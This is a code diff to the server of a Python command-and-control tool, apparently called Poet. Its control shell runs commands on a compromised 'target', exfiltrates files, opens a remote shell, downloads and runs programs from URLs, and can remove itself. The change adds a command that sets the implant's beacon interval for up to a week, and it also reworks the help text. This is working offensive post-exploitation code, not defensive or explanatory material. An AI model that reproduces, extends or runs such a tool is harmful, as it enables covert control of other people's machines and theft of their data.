@@ -103,10 +103,10 @@ class PoetServer(object):
         self.s = s
         self.port = port
         self.conn = None
+        self.cmds = ['exit', 'help', 'exec', 'recon', 'shell', 'exfil',
+                     'selfdestruct', 'dlexec', 'chint']
 
     def psh(self):
-        cmds = ['exit', 'help', 'exec', 'recon', 'shell', 'exfil',
-                'selfdestruct', 'dlexec']
         print '[+] ({}) Entering control shell'.format(datetime.now())
         self.conn = PoetSocket(self.s.accept()[0])
         prompt = self.conn.exchange('getprompt')
@@ -119,21 +119,21 @@ class PoetServer(object):
                     continue
                 base = inp.split()[0]
                 # exit
-                if base == cmds[0]:
+                if base == self.cmds[0]:
                     break
                 # help
-                elif base == cmds[1]:
-                    print 'Commands:\n  {}'.format('\n  '.join(cmds))
+                elif base == self.cmds[1]:
+                    print 'Commands:\n  {}'.format('\n  '.join(sorted(self.cmds)))
                 # exec
-                elif base == cmds[2]:
+                elif base == self.cmds[2]:
                     inp += ' '  # for regex
                     exec_regex = '^exec( -o( [\w.]+)?)? (("[^"]+")\ )+$'
                     if re.search(exec_regex, inp):
                         self.generic(*self.exec_preproc(inp))
                     else:
-                        self.cmd_help(cmds, 2)
+                        self.cmd_help(2)
                 # recon
-                elif base == cmds[3]:
+                elif base == self.cmds[3]:
                     if re.search('^recon( -o( [\w.]+)?)?$', inp):
                         if '-o' in inp.split():
                             if len(inp.split()) == 3:
@@ -143,15 +143,15 @@ class PoetServer(object):
                         else:
                             self.generic(base)
                     else:
-                        self.cmd_help(cmds, 3)
+                        self.cmd_help(3)
                 # shell
-                elif base == cmds[4]:
+                elif base == self.cmds[4]:
                     if inp == 'shell':
                         self.shell(prompt)
                     else:
-                        self.cmd_help(cmds, 4)
+                        self.cmd_help(4)
                 # exfil
-                elif base == cmds[5]:
+                elif base == self.cmds[5]:
                     if re.search('^exfil ([\w\/\\.~:]+ )+$', inp + ' '):
                         for file in inp.split()[1:]:
                             resp = self.conn.exchange('exfil ' + file)
@@ -161,9 +161,9 @@ class PoetServer(object):
                             self.write(resp, base, OUT,
                                        file.split('/')[-1].strip('.'))
                     else:
-                        self.cmd_help(cmds, 5)
+                        self.cmd_help(5)
                 # selfdestruct
-                elif base == cmds[6]:
+                elif base == self.cmds[6]:
                     if inp == 'selfdestruct':
                         print """[!] WARNING: You are about to permanently remove the client from the target.
     You will immediately lose access to the target. Continue? (y/n)""",
@@ -177,15 +177,27 @@ class PoetServer(object):
                         else:
                             print 'psh : Aborting self destruct.'
                     else:
-                        self.cmd_help(cmds, 6)
+                        self.cmd_help(6)
                 # dlexec
-                elif base == cmds[7]:
+                elif base == self.cmds[7]:
                     if re.search('^dlexec https?:\/\/[\w.\/]+$', inp):
                         resp = self.conn.exchange(inp)
                         msg = 'successful' if resp == 'done' else 'error: ' + resp
                         print 'psh : dlexec {}'.format(msg)
                     else:
-                        self.cmd_help(cmds, 7)
+                        self.cmd_help(7)
+                # chint
+                elif base == self.cmds[8]:
+                    if re.search('^chint \d+$', inp):
+                        num = int(inp[6:])
+                        if num < 1 or num > 604800:
+                            print 'psh : Invalid interval time.'
+                        else:
+                            resp = self.conn.exchange(inp)
+                            msg = 'successful' if resp == 'done' else 'error: ' + resp
+                            print 'psh : chint ({}) {}'.format(num, msg)
+                    else:
+                        self.cmd_help(8)
                 else:
                     print 'psh: {}: command not found'.format(base)
             except KeyboardInterrupt:
@@ -222,7 +234,7 @@ class PoetServer(object):
             f.write(response)
             print 'psh : {} written to {}'.format(prefix, outfile)
 
-    def cmd_help(self, cmds, ind):
+    def cmd_help(self, ind):
         if ind == 2:
             print 'Execute commands on target.'
             print 'usage: exec [-o [filename]] "cmd1" ["cmd2" "cmd3" ...]'
@@ -256,8 +268,15 @@ class PoetServer(object):
             print '-h\t\tshow help'
         elif ind == 7:
             print 'Download and execute.'
-            print 'usage: dlexec http://my.pro/gram [-h]'
+            print 'usage: dlexec [-h] http://my.pro/gram'
             print '\nDownload executable from internet and execute.'
+            print '\noptions:'
+            print '-h\t\tshow help'
+        elif ind == 8:
+            print 'Change interval.'
+            print 'usage: chint [-h] seconds'
+            print '\nChange the client delay interval (seconds).'
+            print 'Minimum allowed value is 1 and maximum is 604800 (1 week).'
             print '\noptions:'
             print '-h\t\tshow help'
 
